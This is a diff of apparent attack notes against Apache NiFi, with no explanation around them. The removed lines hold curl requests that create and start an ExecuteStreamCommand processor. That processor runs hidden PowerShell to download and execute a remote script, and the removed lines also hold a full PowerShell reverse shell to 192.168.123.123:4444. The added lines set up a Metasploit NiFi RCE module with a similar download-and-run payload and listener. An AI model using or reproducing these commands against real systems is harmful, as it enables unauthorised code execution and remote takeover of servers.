@@ -1,43 +1,9 @@
-curl -X POST http://target:8080/nifi-api/process-groups/<PG_ID>/processors \
--H 'Content-Type: application/json' \
--d '{
-  "component": {
-    "type": "org.apache.nifi.processors.standard.ExecuteStreamCommand",
-    "name": "revsh",
-    "config": {
-      "properties": {
-        "Command": "powershell.exe",
-        "Command Arguments": "-NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.123.123/shell.ps1')\"",
-        "Batch Duration": "0 sec"
-      },
-      "schedulingPeriod": "10 sec",
-      "autoTerminatedRelationships": ["success"]
-    }
-  },
-  "revision": {"version": 0}
-}'
-
-
-
-$client = New-Object System.Net.Sockets.TCPClient("192.168.123.123",4444);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-  $sendback = (iex $data 2>&1 | Out-String );
-  $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
-  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-  $stream.Write($sendbyte,0,$sendbyte.Length);
-  $stream.Flush();
-}
-$client.Close()
-
-
-curl -X PUT http://target:8080/nifi-api/processors/82ff50a9-0198-1000-cf7c-4caa3e47fe9d/run-status \
--H "Content-Type: application/json" \
--d '{
-  "revision": {
-    "version": 1
-  },
-  "state": "RUNNING"
-}'
+use exploit/multi/http/apache_nifi_processor_rce
+set RHOSTS 192.1
+set RPORT 8080
+set TARGETURI /nifi
+set SSL false
+set CMD powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<your-kali-ip>/shell.ps1')"
+set LHOST <your-kali-ip>
+set LPORT 4444
+exploit
